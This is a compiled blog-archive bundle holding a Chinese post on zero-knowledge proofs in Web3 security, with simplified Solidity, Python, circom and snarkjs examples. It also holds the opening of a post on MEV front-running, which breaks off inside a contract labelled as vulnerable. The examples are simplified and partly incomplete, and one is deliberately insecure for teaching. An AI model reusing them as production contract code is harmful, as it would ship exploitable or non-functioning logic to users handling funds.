"use strict";(globalThis.webpackChunkblog_v1=globalThis.webpackChunkblog_v1||[]).push([[2013],{4888(n){n.exports=JSON.parse('{"archive":{"blogPosts":[{"id":"zero-knowledge-proofs-security","metadata":{"permalink":"/zero-knowledge-proofs-security","editUrl":"https://github.com/pfyangf/pfyangf.github.io/tree/main/blog/2026/02-05-zero-knowledge-proofs-security.md","source":"@site/blog/2026/02-05-zero-knowledge-proofs-security.md","title":"\u96f6\u77e5\u8bc6\u8bc1\u660e\u5728Web3\u5b89\u5168\u4e2d\u7684\u5e94\u7528\uff1a\u4ece\u7406\u8bba\u5230\u5b9e\u8df5","description":"\u96f6\u77e5\u8bc6\u8bc1\u660e\uff08Zero-Knowledge Proofs, ZKP\uff09\u6b63\u5728revolutionize Web3\u7684\u9690\u79c1\u548c\u5b89\u5168\u3002\u4eceZK-Rollups\u5230\u9690\u79c1\u4ea4\u6613\uff0cZKP\u6280\u672f\u5df2\u6210\u4e3a\u533a\u5757\u94fe\u6269\u5c55\u6027\u548c\u9690\u79c1\u4fdd\u62a4\u7684\u5173\u952e\u3002","date":"2026-02-05T10:00:00.000Z","tags":[{"inline":true,"label":"\u96f6\u77e5\u8bc6\u8bc1\u660e","permalink":"/tags/\u96f6\u77e5\u8bc6\u8bc1\u660e"},{"inline":true,"label":"ZK-SNARKs","permalink":"/tags/zk-snar-ks"},{"inline":true,"label":"ZK-STARKs","permalink":"/tags/zk-star-ks"},{"inline":true,"label":"\u9690\u79c1\u4fdd\u62a4","permalink":"/tags/\u9690\u79c1\u4fdd\u62a4"},{"inline":true,"label":"Web3\u5b89\u5168","permalink":"/tags/web-3-\u5b89\u5168"}],"readingTime":7.51,"hasTruncateMarker":true,"authors":[{"name":"AutoSec Team","title":"Web3 Security Researchers","url":"https://autosec.dev","imageURL":"/img/autosec.logo.png","key":"autosec","page":null}],"frontMatter":{"slug":"zero-knowledge-proofs-security","title":"\u96f6\u77e5\u8bc6\u8bc1\u660e\u5728Web3\u5b89\u5168\u4e2d\u7684\u5e94\u7528\uff1a\u4ece\u7406\u8bba\u5230\u5b9e\u8df5","authors":["autosec"],"tags":["\u96f6\u77e5\u8bc6\u8bc1\u660e","ZK-SNARKs","ZK-STARKs","\u9690\u79c1\u4fdd\u62a4","Web3\u5b89\u5168"],"date":"2026-02-05T10:00"},"unlisted":false,"nextItem":{"title":"MEV\u653b\u51fb\u5168\u666f\u56fe\uff1a\u4ece\u4e09\u660e\u6cbb\u653b\u51fb\u5230\u9632\u5fa1\u7b56\u7565","permalink":"/mev-attacks-prevention"}},"content":"\u96f6\u77e5\u8bc6\u8bc1\u660e\uff08Zero-Knowledge Proofs, ZKP\uff09\u6b63\u5728revolutionize Web3\u7684\u9690\u79c1\u548c\u5b89\u5168\u3002\u4eceZK-Rollups\u5230\u9690\u79c1\u4ea4\u6613\uff0cZKP\u6280\u672f\u5df2\u6210\u4e3a\u533a\u5757\u94fe\u6269\u5c55\u6027\u548c\u9690\u79c1\u4fdd\u62a4\u7684\u5173\u952e\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \u4ec0\u4e48\u662f\u96f6\u77e5\u8bc6\u8bc1\u660e\uff1f\\n\\n\u96f6\u77e5\u8bc6\u8bc1\u660e\u5141\u8bb8\u4e00\u65b9\uff08\u8bc1\u660e\u8005\uff09\u5411\u53e6\u4e00\u65b9\uff08\u9a8c\u8bc1\u8005\uff09\u8bc1\u660e\u67d0\u4e2a\u9648\u8ff0\u662f\u771f\u5b9e\u7684\uff0c\u800c\u65e0\u9700\u900f\u9732\u9664\u8be5\u9648\u8ff0\u771f\u5b9e\u6027\u4e4b\u5916\u7684\u4efb\u4f55\u4fe1\u606f\u3002\\n\\n### \u6838\u5fc3\u7279\u6027\\n\\n1. **\u5b8c\u5907\u6027\uff08Completeness\uff09**\uff1a\u5982\u679c\u9648\u8ff0\u4e3a\u771f\uff0c\u8bda\u5b9e\u7684\u9a8c\u8bc1\u8005\u4f1a\u88ab\u8bda\u5b9e\u7684\u8bc1\u660e\u8005\u8bf4\u670d\\n2. **\u53ef\u9760\u6027\uff08Soundness\uff09**\uff1a\u5982\u679c\u9648\u8ff0\u4e3a\u5047\uff0c\u6ca1\u6709\u6b3a\u9a97\u6027\u8bc1\u660e\u8005\u80fd\u591f\u8bf4\u670d\u8bda\u5b9e\u7684\u9a8c\u8bc1\u8005\\n3. **\u96f6\u77e5\u8bc6\u6027\uff08Zero-Knowledge\uff09**\uff1a\u9a8c\u8bc1\u8005\u9664\u4e86\u9648\u8ff0\u4e3a\u771f\u4e4b\u5916\uff0c\u5b66\u4e0d\u5230\u4efb\u4f55\u5176\u4ed6\u4fe1\u606f\\n\\n## ZK-SNARKs vs ZK-STARKs\\n\\n### ZK-SNARKs (Zero-Knowledge Succinct Non-Interactive Argument of Knowledge)\\n\\n```solidity\\n// ZK-SNARK \u9a8c\u8bc1\u5408\u7ea6\u793a\u4f8b\\npragma solidity ^0.8.0;\\n\\ncontract ZKSNARKVerifier {\\n    struct VerifyingKey {\\n        Pairing.G1Point alpha;\\n        Pairing.G2Point beta;\\n        Pairing.G2Point gamma;\\n        Pairing.G2Point delta;\\n        Pairing.G1Point[] gamma_abc;\\n    }\\n    \\n    struct Proof {\\n        Pairing.G1Point a;\\n        Pairing.G2Point b;\\n        Pairing.G1Point c;\\n    }\\n    \\n    function verify(\\n        uint[] memory input,\\n        Proof memory proof\\n    ) public view returns (bool) {\\n        VerifyingKey memory vk = verifyingKey();\\n        \\n        require(input.length + 1 == vk.gamma_abc.length, \\"Invalid input length\\");\\n        \\n        // \u8ba1\u7b97\u7ebf\u6027\u7ec4\u5408\\n        Pairing.G1Point memory vk_x = Pairing.G1Point(0, 0);\\n        for (uint i = 0; i < input.length; i++) {\\n            vk_x = Pairing.addition(\\n                vk_x,\\n                Pairing.scalar_mul(vk.gamma_abc[i + 1], input[i])\\n            );\\n        }\\n        vk_x = Pairing.addition(vk_x, vk.gamma_abc[0]);\\n        \\n        // \u9a8c\u8bc1\u914d\u5bf9\\n        return Pairing.pairingProd4(\\n            proof.a, proof.b,\\n            Pairing.negate(vk_x), vk.gamma,\\n            Pairing.negate(proof.c), vk.delta,\\n            Pairing.negate(vk.alpha), vk.beta\\n        );\\n    }\\n}\\n```\\n\\n**\u4f18\u70b9\uff1a**\\n- \u8bc1\u660e\u5927\u5c0f\u5c0f\uff08\u7ea6200\u5b57\u8282\uff09\\n- \u9a8c\u8bc1\u901f\u5ea6\u5feb\\n- Gas\u6210\u672c\u4f4e\\n\\n**\u7f3a\u70b9\uff1a**\\n- \u9700\u8981\u53ef\u4fe1\u8bbe\u7f6e\uff08Trusted Setup\uff09\\n- \u91cf\u5b50\u8ba1\u7b97\u4e0d\u5b89\u5168\\n- \u8bbe\u7f6e\u8fc7\u7a0b\u590d\u6742\\n\\n### ZK-STARKs (Zero-Knowledge Scalable Transparent Argument of Knowledge)\\n\\n```python\\n# ZK-STARK \u8bc1\u660e\u751f\u6210\u793a\u4f8b\uff08\u7b80\u5316\u7248\uff09\\nfrom hashlib import sha256\\n\\nclass ZKStark:\\n    def __init__(self, field_size):\\n        self.field_size = field_size\\n    \\n    def generate_proof(self, secret, public_input):\\n        \\"\\"\\"\\n        \u751f\u6210 ZK-STARK \u8bc1\u660e\\n        \\"\\"\\"\\n        # 1. \u6784\u5efa\u8ba1\u7b97\u8f68\u8ff9\\n        trace = self.build_trace(secret, public_input)\\n        \\n        # 2. \u63d2\u503c\u591a\u9879\u5f0f\\n        polynomial = self.interpolate(trace)\\n        \\n        # 3. \u751f\u6210 FRI \u8bc1\u660e\\n        fri_proof = self.fri_commit(polynomial)\\n        \\n        # 4. \u751f\u6210\u7ea6\u675f\u8bc1\u660e\\n        constraint_proof = self.prove_constraints(trace)\\n        \\n        return {\\n            \'fri_proof\': fri_proof,\\n            \'constraint_proof\': constraint_proof,\\n            \'merkle_root\': self.compute_merkle_root(trace)\\n        }\\n    \\n    def verify_proof(self, proof, public_input):\\n        \\"\\"\\"\\n        \u9a8c\u8bc1 ZK-STARK \u8bc1\u660e\\n        \\"\\"\\"\\n        # 1. \u9a8c\u8bc1 FRI \u8bc1\u660e\\n        if not self.verify_fri(proof[\'fri_proof\']):\\n            return False\\n        \\n        # 2. \u9a8c\u8bc1\u7ea6\u675f\\n        if not self.verify_constraints(proof[\'constraint_proof\']):\\n            return False\\n        \\n        # 3. \u9a8c\u8bc1 Merkle \u6839\\n        if not self.verify_merkle_root(proof[\'merkle_root\'], public_input):\\n            return False\\n        \\n        return True\\n```\\n\\n**\u4f18\u70b9\uff1a**\\n- \u65e0\u9700\u53ef\u4fe1\u8bbe\u7f6e\\n- \u91cf\u5b50\u5b89\u5168\\n- \u900f\u660e\u6027\u9ad8\\n- \u53ef\u6269\u5c55\u6027\u5f3a\\n\\n**\u7f3a\u70b9\uff1a**\\n- \u8bc1\u660e\u5927\u5c0f\u8f83\u5927\uff08\u7ea6100KB\uff09\\n- \u9a8c\u8bc1\u65f6\u95f4\u8f83\u957f\\n- Gas\u6210\u672c\u8f83\u9ad8\\n\\n## \u5b9e\u9645\u5e94\u7528\u573a\u666f\\n\\n### 1. \u9690\u79c1\u4ea4\u6613 - Tornado Cash\\n\\n```solidity\\n// Tornado Cash \u6838\u5fc3\u5408\u7ea6\uff08\u7b80\u5316\u7248\uff09\\ncontract TornadoCash {\\n    mapping(bytes32 => bool) public nullifierHashes;\\n    mapping(bytes32 => bool) public commitments;\\n    \\n    IVerifier public verifier;\\n    uint256 public denomination;\\n    \\n    event Deposit(bytes32 indexed commitment, uint32 leafIndex, uint256 timestamp);\\n    event Withdrawal(address to, bytes32 nullifierHash, address indexed relayer, uint256 fee);\\n    \\n    function deposit(bytes32 _commitment) external payable {\\n        require(msg.value == denomination, \\"Invalid denomination\\");\\n        require(!commitments[_commitment], \\"Commitment already exists\\");\\n        \\n        commitments[_commitment] = true;\\n        emit Deposit(_commitment, uint32(nextIndex), block.timestamp);\\n    }\\n    \\n    function withdraw(\\n        bytes calldata _proof,\\n        bytes32 _root,\\n        bytes32 _nullifierHash,\\n        address payable _recipient,\\n        address payable _relayer,\\n        uint256 _fee\\n    ) external {\\n        require(!nullifierHashes[_nullifierHash], \\"Note already spent\\");\\n        require(isKnownRoot(_root), \\"Invalid merkle root\\");\\n        \\n        // \u9a8c\u8bc1 ZK \u8bc1\u660e\\n        require(\\n            verifier.verifyProof(\\n                _proof,\\n                [uint256(_root), uint256(_nullifierHash), uint256(_recipient), uint256(_relayer), _fee]\\n            ),\\n            \\"Invalid proof\\"\\n        );\\n        \\n        nullifierHashes[_nullifierHash] = true;\\n        \\n        // \u8f6c\u8d26\\n        _recipient.transfer(denomination - _fee);\\n        if (_fee > 0) {\\n            _relayer.transfer(_fee);\\n        }\\n        \\n        emit Withdrawal(_recipient, _nullifierHash, _relayer, _fee);\\n    }\\n}\\n```\\n\\n### 2. ZK-Rollups - \u6269\u5c55\u6027\u89e3\u51b3\u65b9\u6848\\n\\n```solidity\\n// ZK-Rollup \u5408\u7ea6\u793a\u4f8b\\ncontract ZKRollup {\\n    struct Block {\\n        bytes32 stateRoot;\\n        bytes32 transactionsRoot;\\n        uint256 blockNumber;\\n        uint256 timestamp;\\n    }\\n    \\n    Block[] public blocks;\\n    IVerifier public verifier;\\n    \\n    mapping(address => uint256) public balances;\\n    \\n    event BlockCommitted(uint256 indexed blockNumber, bytes32 stateRoot);\\n    event BlockVerified(uint256 indexed blockNumber);\\n    \\n    function commitBlock(\\n        bytes32 _newStateRoot,\\n        bytes32 _transactionsRoot,\\n        bytes calldata _proof\\n    ) external {\\n        uint256 blockNumber = blocks.length;\\n        bytes32 oldStateRoot = blockNumber > 0 ? blocks[blockNumber - 1].stateRoot : bytes32(0);\\n        \\n        // \u9a8c\u8bc1\u72b6\u6001\u8f6c\u6362\u8bc1\u660e\\n        require(\\n            verifier.verifyProof(\\n                _proof,\\n                [uint256(oldStateRoot), uint256(_newStateRoot), uint256(_transactionsRoot)]\\n            ),\\n            \\"Invalid state transition proof\\"\\n        );\\n        \\n        blocks.push(Block({\\n            stateRoot: _newStateRoot,\\n            transactionsRoot: _transactionsRoot,\\n            blockNumber: blockNumber,\\n            timestamp: block.timestamp\\n        }));\\n        \\n        emit BlockCommitted(blockNumber, _newStateRoot);\\n        emit BlockVerified(blockNumber);\\n    }\\n    \\n    function deposit() external payable {\\n        balances[msg.sender] += msg.value;\\n    }\\n    \\n    function withdraw(\\n        uint256 amount,\\n        bytes32[] calldata merkleProof\\n    ) external {\\n        require(balances[msg.sender] >= amount, \\"Insufficient balance\\");\\n        require(verifyMerkleProof(msg.sender, amount, merkleProof), \\"Invalid proof\\");\\n        \\n        balances[msg.sender] -= amount;\\n        payable(msg.sender).transfer(amount);\\n    }\\n    \\n    function verifyMerkleProof(\\n        address account,\\n        uint256 amount,\\n        bytes32[] calldata proof\\n    ) internal view returns (bool) {\\n        bytes32 leaf = keccak256(abi.encodePacked(account, amount));\\n        bytes32 computedHash = leaf;\\n        \\n        for (uint256 i = 0; i < proof.length; i++) {\\n            computedHash = keccak256(\\n                abi.encodePacked(\\n                    computedHash < proof[i] ? computedHash : proof[i],\\n                    computedHash < proof[i] ? proof[i] : computedHash\\n                )\\n            );\\n        }\\n        \\n        return computedHash == blocks[blocks.length - 1].stateRoot;\\n    }\\n}\\n```\\n\\n### 3. \u8eab\u4efd\u9a8c\u8bc1 - \u5e74\u9f84\u8bc1\u660e\\n\\n```javascript\\n// \u4f7f\u7528 circom \u5b9a\u4e49\u5e74\u9f84\u8bc1\u660e\u7535\u8def\\npragma circom 2.0.0;\\n\\ntemplate AgeProof() {\\n    signal input birthYear;\\n    signal input currentYear;\\n    signal input minAge;\\n    signal input secret; // \u7528\u4e8e\u9690\u79c1\\n    \\n    signal output isOldEnough;\\n    \\n    // \u8ba1\u7b97\u5e74\u9f84\\n    signal age;\\n    age <== currentYear - birthYear;\\n    \\n    // \u68c0\u67e5\u662f\u5426\u6ee1\u8db3\u6700\u5c0f\u5e74\u9f84\u8981\u6c42\\n    component greaterEqThan = GreaterEqThan(32);\\n    greaterEqThan.in[0] <== age;\\n    greaterEqThan.in[1] <== minAge;\\n    \\n    isOldEnough <== greaterEqThan.out;\\n    \\n    // \u786e\u4fdd secret \u88ab\u4f7f\u7528\uff08\u9632\u6b62\u4f18\u5316\u6389\uff09\\n    signal secretSquared;\\n    secretSquared <== secret * secret;\\n}\\n\\ncomponent main = AgeProof();\\n```\\n\\n**\u4f7f\u7528\u793a\u4f8b\uff1a**\\n\\n```javascript\\nconst snarkjs = require(\'snarkjs\');\\nconst fs = require(\'fs\');\\n\\nasync function proveAge(birthYear, currentYear, minAge, secret) {\\n    const input = {\\n        birthYear: birthYear,\\n        currentYear: currentYear,\\n        minAge: minAge,\\n        secret: secret\\n    };\\n    \\n    // \u751f\u6210\u8bc1\u660e\\n    const { proof, publicSignals } = await snarkjs.groth16.fullProve(\\n        input,\\n        \'age_proof.wasm\',\\n        \'age_proof_final.zkey\'\\n    );\\n    \\n    // \u5bfc\u51fa Solidity \u8c03\u7528\u6570\u636e\\n    const calldata = await snarkjs.groth16.exportSolidityCallData(proof, publicSignals);\\n    \\n    return { proof, publicSignals, calldata };\\n}\\n\\nasync function verifyAge(proof, publicSignals) {\\n    const vKey = JSON.parse(fs.readFileSync(\'verification_key.json\'));\\n    const res = await snarkjs.groth16.verify(vKey, publicSignals, proof);\\n    return res;\\n}\\n\\n// \u4f7f\u7528\\n(async () => {\\n    const { proof, publicSignals } = await proveAge(1990, 2026, 18, 12345);\\n    const isValid = await verifyAge(proof, publicSignals);\\n    console.log(\'Proof valid:\', isValid);\\n    console.log(\'Is old enough:\', publicSignals[0] === \'1\');\\n})();\\n```\\n\\n## \u5b89\u5168\u8003\u8651\\n\\n### 1. \u53ef\u4fe1\u8bbe\u7f6e\u5b89\u5168\\n\\n```solidity\\n// \u591a\u65b9\u8ba1\u7b97\uff08MPC\uff09\u53ef\u4fe1\u8bbe\u7f6e\\ncontract TrustedSetupMPC {\\n    struct Contribution {\\n        address contributor;\\n        bytes32 publicKey;\\n        bytes32 commitment;\\n        uint256 timestamp;\\n    }\\n    \\n    Contribution[] public contributions;\\n    uint256 public constant MIN_CONTRIBUTORS = 10;\\n    \\n    event ContributionAdded(address indexed contributor, uint256 index);\\n    \\n    function contribute(bytes32 publicKey, bytes32 commitment) external {\\n        require(contributions.length < 100, \\"Max contributors reached\\");\\n        \\n        contributions.push(Contribution({\\n            contributor: msg.sender,\\n            publicKey: publicKey,\\n            commitment: commitment,\\n            timestamp: block.timestamp\\n        }));\\n        \\n        emit ContributionAdded(msg.sender, contributions.length - 1);\\n    }\\n    \\n    function isSetupComplete() public view returns (bool) {\\n        return contributions.length >= MIN_CONTRIBUTORS;\\n    }\\n}\\n```\\n\\n### 2. \u7535\u8def\u6f0f\u6d1e\u68c0\u6d4b\\n\\n```python\\n# \u7535\u8def\u7ea6\u675f\u68c0\u67e5\u5de5\u5177\\nclass CircuitAuditor:\\n    def __init__(self, circuit):\\n        self.circuit = circuit\\n        self.vulnerabilities = []\\n    \\n    def check_underconstraint(self):\\n        \\"\\"\\"\u68c0\u67e5\u7ea6\u675f\u4e0d\u8db3\\"\\"\\"\\n        for signal in self.circuit.signals:\\n            constraints = self.circuit.get_constraints_for_signal(signal)\\n            if len(constraints) == 0:\\n                self.vulnerabilities.append({\\n                    \'type\': \'UNDERCONSTRAINED\',\\n                    \'signal\': signal,\\n                    \'severity\': \'HIGH\'\\n                })\\n    \\n    def check_overflow(self):\\n        \\"\\"\\"\u68c0\u67e5\u6ea2\u51fa\u98ce\u9669\\"\\"\\"\\n        for operation in self.circuit.operations:\\n            if operation.type in [\'MUL\', \'ADD\']:\\n                max_value = self.estimate_max_value(operation)\\n                if max_value > self.circuit.field_size:\\n                    self.vulnerabilities.append({\\n                        \'type\': \'OVERFLOW\',\\n                        \'operation\': operation,\\n                        \'severity\': \'CRITICAL\'\\n                    })\\n    \\n    def check_malleability(self):\\n        \\"\\"\\"\u68c0\u67e5\u53ef\u5851\u6027\u653b\u51fb\\"\\"\\"\\n        # \u68c0\u67e5\u662f\u5426\u5b58\u5728\u591a\u4e2a\u6709\u6548\u8bc1\u660e\\n        pass\\n    \\n    def generate_report(self):\\n        return {\\n            \'total_vulnerabilities\': len(self.vulnerabilities),\\n            \'critical\': len([v for v in self.vulnerabilities if v[\'severity\'] == \'CRITICAL\']),\\n            \'high\': len([v for v in self.vulnerabilities if v[\'severity\'] == \'HIGH\']),\\n            \'details\': self.vulnerabilities\\n        }\\n```\\n\\n## \u6027\u80fd\u4f18\u5316\\n\\n### 1. \u6279\u91cf\u9a8c\u8bc1\\n\\n```solidity\\n// \u6279\u91cf ZK \u8bc1\u660e\u9a8c\u8bc1\\ncontract BatchVerifier {\\n    IVerifier public verifier;\\n    \\n    struct ProofBatch {\\n        bytes[] proofs;\\n        uint256[][] publicInputs;\\n    }\\n    \\n    function verifyBatch(ProofBatch calldata batch) external view returns (bool) {\\n        require(batch.proofs.length == batch.publicInputs.length, \\"Length mismatch\\");\\n        require(batch.proofs.length <= 100, \\"Batch too large\\");\\n        \\n        // \u6279\u91cf\u9a8c\u8bc1\u53ef\u4ee5\u8282\u7701\u7ea630-40%\u7684gas\\n        for (uint256 i = 0; i < batch.proofs.length; i++) {\\n            if (!verifier.verifyProof(batch.proofs[i], batch.publicInputs[i])) {\\n                return false;\\n            }\\n        }\\n        \\n        return true;\\n    }\\n}\\n```\\n\\n### 2. \u9012\u5f52\u8bc1\u660e\\n\\n```javascript\\n// \u9012\u5f52 SNARK \u793a\u4f8b\\nasync function recursiveProof(proofs) {\\n    // \u7b2c\u4e00\u5c42\uff1a\u9a8c\u8bc1\u591a\u4e2a\u57fa\u7840\u8bc1\u660e\\n    const layer1Proofs = [];\\n    for (let i = 0; i < proofs.length; i += 2) {\\n        const aggregated = await aggregateProofs(proofs[i], proofs[i + 1]);\\n        layer1Proofs.push(aggregated);\\n    }\\n    \\n    // \u7b2c\u4e8c\u5c42\uff1a\u805a\u5408\u7b2c\u4e00\u5c42\u8bc1\u660e\\n    if (layer1Proofs.length > 1) {\\n        return recursiveProof(layer1Proofs);\\n    }\\n    \\n    return layer1Proofs[0];\\n}\\n\\nasync function aggregateProofs(proof1, proof2) {\\n    const input = {\\n        proof1: proof1,\\n        proof2: proof2\\n    };\\n    \\n    const { proof } = await snarkjs.groth16.fullProve(\\n        input,\\n        \'recursive_verifier.wasm\',\\n        \'recursive_verifier.zkey\'\\n    );\\n    \\n    return proof;\\n}\\n```\\n\\n## \u6700\u4f73\u5b9e\u8df5\\n\\n### 1. \u7535\u8def\u8bbe\u8ba1\\n\\n```circom\\n// \u5b89\u5168\u7684\u7535\u8def\u8bbe\u8ba1\u6a21\u5f0f\\ntemplate SecureTransfer() {\\n    signal input amount;\\n    signal input balance;\\n    signal input newBalance;\\n    \\n    // 1. \u8303\u56f4\u68c0\u67e5\\n    component rangeCheck = RangeCheck(64);\\n    rangeCheck.in <== amount;\\n    \\n    // 2. \u6ea2\u51fa\u68c0\u67e5\\n    component overflowCheck = LessThan(64);\\n    overflowCheck.in[0] <== amount;\\n    overflowCheck.in[1] <== balance;\\n    overflowCheck.out === 1;\\n    \\n    // 3. \u4f59\u989d\u8ba1\u7b97\\n    newBalance === balance - amount;\\n    \\n    // 4. \u975e\u8d1f\u68c0\u67e5\\n    component nonNegative = GreaterEqThan(64);\\n    nonNegative.in[0] <== newBalance;\\n    nonNegative.in[1] <== 0;\\n    nonNegative.out === 1;\\n}\\n```\\n\\n### 2. \u5ba1\u8ba1\u6e05\u5355\\n\\n- \u2705 \u6240\u6709\u4fe1\u53f7\u90fd\u6709\u5145\u5206\u7ea6\u675f\\n- \u2705 \u8303\u56f4\u68c0\u67e5\u8986\u76d6\u6240\u6709\u6570\u503c\\n- \u2705 \u6ea2\u51fa\u4fdd\u62a4\\n- \u2705 \u552f\u4e00\u6027\u4fdd\u8bc1\uff08\u9632\u6b62\u91cd\u653e\uff09\\n- \u2705 \u53ef\u4fe1\u8bbe\u7f6e\u53c2\u6570\u9500\u6bc1\\n- \u2705 \u7535\u8def\u903b\u8f91\u6b63\u786e\u6027\u8bc1\u660e\\n- \u2705 Gas\u4f18\u5316\\n- \u2705 \u9519\u8bef\u5904\u7406\\n\\n## \u5de5\u5177\u63a8\u8350\\n\\n### \u5f00\u53d1\u5de5\u5177\\n- **Circom**: \u7535\u8def\u5f00\u53d1\u8bed\u8a00\\n- **snarkjs**: JavaScript ZK\u5e93\\n- **ZoKrates**: \u9ad8\u7ea7ZK\u5de5\u5177\u94fe\\n- **Noir**: Aztec\u7684ZK\u8bed\u8a00\\n\\n### \u5ba1\u8ba1\u5de5\u5177\\n- **ecne**: \u7535\u8def\u7ea6\u675f\u68c0\u67e5\\n- **Picus**: \u5f62\u5f0f\u5316\u9a8c\u8bc1\\n- **ZKProof Community**: \u6807\u51c6\u548c\u6700\u4f73\u5b9e\u8df5\\n\\n## \u672a\u6765\u5c55\u671b\\n\\n1. **\u786c\u4ef6\u52a0\u901f**: \u4e13\u7528ZK\u82af\u7247\\n2. **\u901a\u7528ZK\u865a\u62df\u673a**: zkEVM, zkWASM\\n3. **\u91cf\u5b50\u6297\u6027**: \u540e\u91cf\u5b50ZK\u534f\u8bae\\n4. **\u8de8\u94feZK\u6865**: \u65e0\u4fe1\u4efb\u8de8\u94fe\u901a\u4fe1\\n\\n## \u603b\u7ed3\\n\\n\u96f6\u77e5\u8bc6\u8bc1\u660e\u6b63\u5728\u91cd\u5851Web3\u7684\u9690\u79c1\u548c\u6269\u5c55\u6027\uff1a\\n\\n- \ud83d\udd10 **\u9690\u79c1\u4fdd\u62a4**: \u5728\u4e0d\u6cc4\u9732\u4fe1\u606f\u7684\u60c5\u51b5\u4e0b\u9a8c\u8bc1\\n- \u26a1 **\u6269\u5c55\u6027**: ZK-Rollups\u63d0\u4f9b10-100x\u541e\u5410\u91cf\u63d0\u5347\\n- \ud83d\udee1\ufe0f **\u5b89\u5168\u6027**: \u6570\u5b66\u4fdd\u8bc1\u7684\u6b63\u786e\u6027\\n- \ud83c\udf10 **\u4e92\u64cd\u4f5c\u6027**: \u8de8\u94fe\u9690\u79c1\u901a\u4fe1\\n\\n\u8bb0\u4f4f\uff1a**ZK\u6280\u672f\u5f3a\u5927\u4f46\u590d\u6742\uff0c\u5fc5\u987b\u7ecf\u8fc7\u4e25\u683c\u5ba1\u8ba1\u548c\u6d4b\u8bd5**\u3002\\n\\n---\\n\\n**AutoSec** - \u63a2\u7d22Web3\u5b89\u5168\u7684\u524d\u6cbf\u6280\u672f"},{"id":"mev-attacks-prevention","metadata":{"permalink":"/mev-attacks-prevention","editUrl":"https://github.com/pfyangf/pfyangf.github.io/tree/main/blog/2026/02-04-mev-attacks-prevention.md","source":"@site/blog/2026/02-04-mev-attacks-prevention.md","title":"MEV\u653b\u51fb\u5168\u666f\u56fe\uff1a\u4ece\u4e09\u660e\u6cbb\u653b\u51fb\u5230\u9632\u5fa1\u7b56\u7565","description":"\u6700\u5927\u53ef\u63d0\u53d6\u4ef7\u503c\uff08MEV, Maximal Extractable Value\uff09\u5df2\u6210\u4e3aDeFi\u751f\u6001\u7cfb\u7edf\u4e2d\u6700\u4e25\u91cd\u7684\u5b89\u5168\u5a01\u80c1\u4e4b\u4e00\u30022023\u5e74\uff0cMEV\u63d0\u53d6\u603b\u989d\u8d85\u8fc76\u4ebf\u7f8e\u5143\uff0c\u5176\u4e2d\u5927\u90e8\u5206\u6765\u81ea\u5bf9\u666e\u901a\u7528\u6237\u7684\u653b\u51fb\u3002","date":"2026-02-04T10:00:00.000Z","tags":[{"inline":true,"label":"MEV","permalink":"/tags/mev"},{"inline":true,"label":"\u62a2\u8dd1\u653b\u51fb","permalink":"/tags/\u62a2\u8dd1\u653b\u51fb"},{"inline":true,"label":"\u4e09\u660e\u6cbb\u653b\u51fb","permalink":"/tags/\u4e09\u660e\u6cbb\u653b\u51fb"},{"inline":true,"label":"DeFi\u5b89\u5168","permalink":"/tags/de-fi\u5b89\u5168"},{"inline":true,"label":"\u533a\u5757\u94fe\u5b89\u5168","permalink":"/tags/\u533a\u5757\u94fe\u5b89\u5168"}],"readingTime":8.3,"hasTruncateMarker":true,"authors":[{"name":"AutoSec Team","title":"Web3 Security Researchers","url":"https://autosec.dev","imageURL":"/img/autosec.logo.png","key":"autosec","page":null}],"frontMatter":{"slug":"mev-attacks-prevention","title":"MEV\u653b\u51fb\u5168\u666f\u56fe\uff1a\u4ece\u4e09\u660e\u6cbb\u653b\u51fb\u5230\u9632\u5fa1\u7b56\u7565","authors":["autosec"],"tags":["MEV","\u62a2\u8dd1\u653b\u51fb","\u4e09\u660e\u6cbb\u653b\u51fb","DeFi\u5b89\u5168","\u533a\u5757\u94fe\u5b89\u5168"],"date":"2026-02-04T10:00"},"unlisted":false,"prevItem":{"title":"\u96f6\u77e5\u8bc6\u8bc1\u660e\u5728Web3\u5b89\u5168\u4e2d\u7684\u5e94\u7528\uff1a\u4ece\u7406\u8bba\u5230\u5b9e\u8df5","permalink":"/zero-knowledge-proofs-security"},"nextItem":{"title":"\u6df1\u5ea6\u89e3\u6790\uff1a\u91cd\u5165\u653b\u51fb\u53ca\u5176\u9632\u5fa1\u7b56\u7565","permalink":"/reentrancy-attack-analysis"}},"content":"\u6700\u5927\u53ef\u63d0\u53d6\u4ef7\u503c\uff08MEV, Maximal Extractable Value\uff09\u5df2\u6210\u4e3aDeFi\u751f\u6001\u7cfb\u7edf\u4e2d\u6700\u4e25\u91cd\u7684\u5b89\u5168\u5a01\u80c1\u4e4b\u4e00\u30022023\u5e74\uff0cMEV\u63d0\u53d6\u603b\u989d\u8d85\u8fc76\u4ebf\u7f8e\u5143\uff0c\u5176\u4e2d\u5927\u90e8\u5206\u6765\u81ea\u5bf9\u666e\u901a\u7528\u6237\u7684\u653b\u51fb\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \u4ec0\u4e48\u662fMEV\uff1f\\n\\nMEV\u662f\u6307\u77ff\u5de5/\u9a8c\u8bc1\u8005\u901a\u8fc7\u91cd\u65b0\u6392\u5e8f\u3001\u63d2\u5165\u6216\u5ba1\u67e5\u533a\u5757\u5185\u7684\u4ea4\u6613\u800c\u53ef\u4ee5\u63d0\u53d6\u7684\u6700\u5927\u4ef7\u503c\u3002\\n\\n### MEV\u7684\u7c7b\u578b\\n\\n1. **\u826f\u6027MEV**: \u5957\u5229\u3001\u6e05\u7b97\\n2. **\u6076\u610fMEV**: \u62a2\u8dd1\u3001\u4e09\u660e\u6cbb\u653b\u51fb\u3001\u65f6\u95f4\u5f3a\u76d7\u653b\u51fb\\n\\n## \u5e38\u89c1MEV\u653b\u51fb\\n\\n### 1. \u62a2\u8dd1\u653b\u51fb\uff08Front-Running\uff09\\n\\n\u653b\u51fb\u8005\u76d1\u63a7\u5185\u5b58\u6c60\uff0c\u53d1\u73b0\u6709\u5229\u53ef\u56fe\u7684\u4ea4\u6613\u540e\uff0c\u901a\u8fc7\u652f\u4ed8\u66f4\u9ad8\u7684gas\u8d39\u7528\u4f7f\u81ea\u5df1\u7684\u4ea4\u6613\u4f18\u5148\u6267\u884c\u3002\\n\\n```solidity\\n// \u6613\u53d7\u62a2\u8dd1\u653b\u51fb\u7684\u5408\u7ea6\\ncontract VulnerableAuction {\\n    address public highestBidder;\\n    uint256 public highestBid;\\n    \\n    function bid() external payable {\\n        require(msg.value > highestBid, \\"Bid too low\\");\\n        \\n        // \u9000\u8fd8\u524d\u4e00\u4e2a\u51fa\u4ef7\u8005\\n        if (highestBidder != address(0)) {\\n            